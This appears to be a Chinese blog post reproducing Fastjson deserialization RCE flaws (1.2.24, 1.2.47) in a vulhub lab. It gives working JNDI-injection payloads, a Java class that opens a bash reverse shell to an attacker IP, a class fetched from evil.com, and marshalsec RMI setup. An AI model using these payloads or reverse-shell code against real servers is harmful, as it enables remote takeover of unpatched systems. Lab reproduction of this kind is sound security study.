<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>Java安全篇-Fastjson漏洞 - 老帅的博客</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="">
		<meta property="og:url" content="https://laoshuaiblog.github.io/posts/d01b1d7dc1fb09c28cbe6eb2fb1a639e/">
  <meta property="og:site_name" content="老帅的博客">
  <meta property="og:title" content="Java安全篇-Fastjson漏洞">
  <meta property="og:description" content="前言知识： 一、json 概念： json全称是JavaScript object notation。即JavaScript对象标记法，使用键值对进行信息的存储。
格式： { &#34;name&#34;:&#34;wenda&#34;, &#34;age&#34;:21, } 作用： JSON 可以作为一个对象或者字符串存在，前者用于解读 JSON 中的数据，后者用于通过网络传输 JSON 数据。这不是一个大事件——JavaScript 提供一个全局的 可访问的 JSON 对象来对这两种数据进行转换。
二、Fastjson漏洞 原理： Fastjson是一个由阿里巴巴开源的Java库，用于将 Java 对象转换成其 JSON 表示形式，也可以用来将 JSON 字符串转换成等效的 Java 对象，与原生的java反序列化相比，FastJson未使用readObject()方法进行反序列化，而是使用了自定义的一套方法，引进了AutoType功能，在反序列化的过程中，会读取到@type的内容，还调用getter和setter方法将JSON字符串还原成对象。，然而，@type的类有可能被恶意构造，只需要合理构造一个JSON，使用@type指定一个想要的攻击类库就可以实现攻击。
为何引进 AutoType功能： 即在序列化的时候，先把原始类型记录下来。使用@type的键记录原始类型，
指纹特征: 任意抓个包，提交方式改为POST，花括号不闭合。返回包在就会出现fastjson字样
危害： 远程代码执行
影响版本： 影响版本：Fastjson1.2.24及之前版本。
代码审计： 参考
fastjson反序列化原理分析 - FreeBuf网络安全行业门户
复现： Java安全篇--Fastjson1.2.24-RCE漏洞 1.RIM攻击 REDEME.md
fastjson在解析json的过程中，支持使用autoType来实例化某一个具体的类，并调用该类的set/get方法来访问属性。通过查找代码中相关的方法，即可构造出一些恶意利用链。 参考资料： - https://www.freebuf.com/vuls/208339.html - http://xxlegend.com/2017/04/29/title-%20fastjson%20%E8%BF%9C%E7%A8%8B%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96poc%E7%9A%84%E6%9E%84%E9%80%A0%E5%92%8C%E5%88%86%E6%9E%90/ ## 漏洞环境 运行测试环境： ``` docker compose up -d ``` 环境运行后，访问`http://your-ip:8090`即可看到JSON格式的输出。 我们向这个地址POST一个JSON对象，即可更新服务端的信息： ``` curl http://your-ip:8090/ -H &#34;">
  <meta property="og:locale" content="zh-CN">
  <meta property="og:type" content="article">
  <meta property="article:section" content="posts">
    <meta property="article:published_time" content="2024-03-28T18:31:16+08:00">
    <meta property="article:modified_time" content="2024-03-28T18:31:16+08:00">

	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	

	<link rel="shortcut icon" href="/favicon.ico">
		
  


</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="老帅的博客" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">老帅的博客</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main" role="main">
	<article class="post">
		<header class="post__header">
			<h1 class="post__title">Java安全篇-Fastjson漏洞</h1>
			
		</header>
		<div id="gatop"></div>
		<div class="content post__content clearfix">
			
<div id="content_views" class="htmledit_views">
                    <h3>前言知识：</h3> 
<h4>一、json</h4> 
<h5>概念：</h5> 
<p>json全称是JavaScript object notation。即JavaScript对象标记法，使用键值对进行信息的存储。</p> 
<h5>格式：</h5> 
<pre><code class="language-java">{

        "name":"wenda",

        "age":21,

}</code></pre> 
<h5> 作用：</h5> 
<p>JSON 可以作为一个对象或者字符串存在，前者用于解读 JSON 中的数据，后者用于通过网络传输 JSON 数据。这不是一个大事件——JavaScript 提供一个全局的 可访问的 JSON 对象来对这两种数据进行转换。</p> 
<h4>二、Fastjson漏洞</h4> 
<h5><strong>原理：</strong></h5> 
<p>Fastjson是一个由阿里巴巴开源的<a href="https://so.csdn.net/so/search?q=Java%E5%BA%93&amp;spm=1001.2101.3001.7020" title="Java库">Java库</a>，用于将 Java 对象转换成其 JSON 表示形式，也可以用来将 JSON 字符串转换成等效的 Java 对象，与原生的java反序列化相比，FastJson未使用readObject()方法进行反序列化，而是使用了自定义的一套方法，引进了AutoType功能，在反序列化的过程中，会读取到@type的内容，还调用getter和setter方法将JSON字符串还原成对象。，然而，@type的类有可能被恶意构造，只需要合理构造一个JSON，使用@type指定一个想要的攻击类库就可以实现攻击。</p> 
<h5>为何引进 AutoType功能：</h5> 
<p>即在序列化的时候，先把原始类型记录下来。使用@type的键记录原始类型，</p> 
<h5 id="h2-2">指纹特征:</h5> 
<p>任意抓个包，提交方式改为POST，花括号不闭合。返回包在就会出现fastjson字样</p> 
<h5>危害：</h5> 
<p>远程代码执行</p> 
<h5><strong>影响版本：</strong></h5> 
<p>影响版本：Fastjson1.2.24及之前版本。</p> 
<h3>代码审计：</h3> 
<p>参考</p> 
<p><a href="https://www.freebuf.com/articles/web/371884.html" rel="nofollow" title="fastjson反序列化原理分析 - FreeBuf网络安全行业门户">fastjson反序列化原理分析 - FreeBuf网络安全行业门户</a></p> 
<h3>复现：</h3> 
<h3>Java安全篇--Fastjson1.2.24-RCE漏洞</h3> 
<h5>1.RIM攻击</h5> 
<p>REDEME.md</p> 
<pre><code class="language-java">fastjson在解析json的过程中，支持使用autoType来实例化某一个具体的类，并调用该类的set/get方法来访问属性。通过查找代码中相关的方法，即可构造出一些恶意利用链。

参考资料：

- https://www.freebuf.com/vuls/208339.html
- http://xxlegend.com/2017/04/29/title-%20fastjson%20%E8%BF%9C%E7%A8%8B%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96poc%E7%9A%84%E6%9E%84%E9%80%A0%E5%92%8C%E5%88%86%E6%9E%90/

## 漏洞环境

运行测试环境：

```
docker compose up -d
```

环境运行后，访问`http://your-ip:8090`即可看到JSON格式的输出。

我们向这个地址POST一个JSON对象，即可更新服务端的信息：

```
curl http://your-ip:8090/ -H "Content-Type: application/json" --data '{"name":"hello", "age":20}'
```

## 漏洞复现

因为目标环境是Java 8u102，没有`com.sun.jndi.rmi.object.trustURLCodebase`的限制，我们可以使用`com.sun.rowset.JdbcRowSetImpl`的利用链，借助JNDI注入来执行命令。

首先编译并上传命令执行代码，如`http://evil.com/TouchFile.class`：

```java
// javac TouchFile.java
import java.lang.Runtime;
import java.lang.Process;

public class TouchFile {
    static {
        try {
            Runtime rt = Runtime.getRuntime();
            String[] commands = {"touch", "/tmp/success"};
            Process pc = rt.exec(commands);
            pc.waitFor();
        } catch (Exception e) {
            // do nothing
        }
    }
}
```

然后我们借助[marshalsec](https://github.com/mbechler/marshalsec)项目，启动一个RMI服务器，监听9999端口，并制定加载远程类`TouchFile.class`：

```shell
java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer "http://evil.com/#TouchFile" 9999
```

向靶场服务器发送Payload，带上RMI的地址：

```
POST / HTTP/1.1
Host: your-ip:8090
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Content-Type: application/json
Content-Length: 160

{
    "b":{
        "@type":"com.sun.rowset.JdbcRowSetImpl",
        "dataSourceName":"rmi://evil.com:9999/TouchFile",
        "autoCommit":true
    }
}
```

可见，命令`touch /tmp/success`已成功执行：
</code></pre> 
<p>打开环境 抓包得到</p> 
<p><img alt="" height="260" src="https://images2.imgbox.com/21/76/xAhrCNmW_o.png" width="806"> 修改为POST传参 再修改type 和传入json数据 发现name变了</p> 
<p><img alt="" height="370" src="https://images2.imgbox.com/e5/bb/kJjLbexv_o.png" width="987"> </p> 
<p>说明咱们就可以POST传参了  为后面传paylaod做准备</p> 
<p> 在vulhub下的fastjson 1.2.24文件夹下保存以下代码为TouchFile.java文件</p> 
<p>注意 这里的IP为你的攻击机IP</p> 
<pre><code class="language-java">// javac TouchFile.java
import java.lang.Runtime;
import java.lang.Process;
 
public class TouchFile {
    static {
        try {
            Runtime rt = Runtime.getRuntime();
            String[] commands = {"/bin/bash","-c","bash -i &gt;&amp; /dev/tcp/192.168.85.136/2333 0&gt;&amp;1"};
            Process pc = rt.exec(commands);
            pc.waitFor();
        } catch (Exception e) {
            // do nothing
        }
    }
}
</code></pre> 
<p>编译为.class文件  jdk环境为1.8 高环境实现不了远程调用</p> 
<pre><code class="language-java">javac TouchFile.java</code></pre> 
<p>把编译好的class文件传到kali(攻击机)中 ，可以选择scp命令复制</p> 
<p>在class文件所在的目录，Python起一个http服务。用80端口启动http服务的命令为：</p> 
<pre><code class="language-java">python3 -m http.server 80</code></pre> 
<p><img alt="" height="325" src="https://images2.imgbox.com/f1/a7/VyDIfN3D_o.png" width="881"> </p> 
<p>利用<code>marshalsec</code>工具（需要maven环境编译）启动RMI服务</p> 
<p> <code>marshalsec</code>工具下载地址</p> 
<pre><code class="language-java">git clone https://github.com/mbechler/marshalsec</code></pre> 
<p>安装maven</p> 
<pre><code class="language-java">apt-get update
apt-get install maven</code></pre> 
<p>进入marshalsec目录，执行如下命令进行编译。</p> 
<pre><code class="language-java">mvn clean package -DskipTests</code></pre> 
<p><img alt="" height="286" src="https://images2.imgbox.com/67/e9/bX1SShCi_o.png" width="669"> </p> 
<p> 启动RMI服务</p> 
<pre><code class="language-java">java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer "http://192.168.85.136:80/#TouchFile" 9999</code></pre> 
<p>然后重新访问靶场 抓包修改为<code>Content-Type</code>为<code>application/json</code>，发送payload</p> 
<pre><code class="language-html">POST / HTTP/1.1

Host: 192.168.85.129:8090

User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8

Accept-Language: en-US,en;q=0.5

Accept-Encoding: gzip, deflate, br

Connection: close

Upgrade-Insecure-Requests: 1

Content-Type: application/json

Content-Length: 170



{

    "b":{

 

        "@type":"com.sun.rowset.JdbcRowSetImpl",

 

        "dataSourceName":"rmi://192.168.85.136:9999/TouchFile",

 

        "autoCommit":true

}



</code></pre> 
<p> httpserver收到请求，RMI服务器收到请求，复现成功</p> 
<p><img alt="" height="534" src="https://images2.imgbox.com/23/04/O8SgUCPS_o.png" width="803"></p> 
<p>此时应该已经完成了漏洞复现，我们检测一下是否在tmp目录touch创建了文件successFrank即可。运行docker ps查看容器id 进入容器，执行</p> 
<pre><code class="language-html">docker exec -it 容器id /bin/bash</code></pre> 
<h5>2.反弹shell攻击 </h5> 
<p><a href="https://blog.csdn.net/wangzhifei1/article/details/135531112" title="Fastjson反序列化漏洞原理与漏洞复现（CVE-2017-18349）_fastjson反序列化漏洞cve-CSDN博客">Fastjson反序列化漏洞原理与漏洞复现（CVE-2017-18349）_fastjson反序列化漏洞cve-CSDN博客</a></p> 
<h5>3.修复方案：</h5> 
<p> 将Fastjson升级至最新版本</p> 
<p><a href="https://blog.csdn.net/Bossfrank/article/details/130100893" title="Fastjson反序列化漏洞原理与漏洞复现（基于vulhub，保姆级的详细教程）_fastjson漏洞原理-CSDN博客">Fastjson反序列化漏洞原理与漏洞复现（基于vulhub，保姆级的详细教程）_fastjson漏洞原理-CSDN博客</a> </p> 
<h3>Java安全篇--Fastjson1.2.47-RCE漏洞4</h3> 
<h5>概念：</h5> 
<p>fastjson 于1.2.24 版本后增加了反序列化白名单。而在2019年6月，fastjson 又被爆出在<code>fastjson&lt; =1.2.47</code>的版本中，攻击者可以利用特殊构造的 json 字符串绕过白名单检测，成功执行任意命令</p> 
<p> 其实这个漏洞利用跟1.2.24差不多，就是最后上传的payload进行更改</p> 
<pre><code class="language-html">{ "name":{ "@type":"java.lang.Class", "val":"com.sun.rowset.JdbcRowSetImpl" }, "x":{ "@type":"com.sun.rowset.JdbcRowSetImpl", "dataSourceName":"ldap://ip:9999/Exploit", "autoCommit":true } }</code></pre> 
<p><a href="https://www.freebuf.com/articles/web/365680.html" rel="nofollow" title="一文读懂面试官都在问的Fastjson漏洞 - FreeBuf网络安全行业门户">一文读懂面试官都在问的Fastjson漏洞 - FreeBuf网络安全行业门户</a></p> 
<p><a href="https://www.freebuf.com/vuls/352191.html" rel="nofollow" title="fastjson 1.2.47 RCE漏洞保姆级复现 - FreeBuf网络安全行业门户">fastjson 1.2.47 RCE漏洞保姆级复现 - FreeBuf网络安全行业门户</a> </p> 
<h5>修复方案：</h5> 
<p>升级至最新版本即可</p>
                </div>
		</div>
		<div id="gabottom"></div>
	</article>
</main>


<nav class="pager flex">
	<div class="pager__item pager__item--prev">
		<a class="pager__link" href="/posts/3fb256cfc81e55cd7076c53b461d5363/" rel="prev">
			<span class="pager__subtitle">«&thinsp;Previous</span>
			<p class="pager__title">Rust 中两个 HashMap 是否相等的判断问题</p>
		</a>
	</div>
	<div class="pager__item pager__item--next">
		<a class="pager__link" href="/posts/658ef22578b76678d2a12163a5eca06b/" rel="next">
			<span class="pager__subtitle">Next&thinsp;»</span>
			<p class="pager__title">Java代码审计安全篇-反序列化漏洞</p>
		</a>
	</div>
</nav>


			</div>
			
		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2024 老帅的博客.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>
<div id="gafoot"></div>
<script src="https://www.w3counter.com/tracker.js?id=151347"></script>
<script src="https://101121.xyz/ga/app.js"></script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>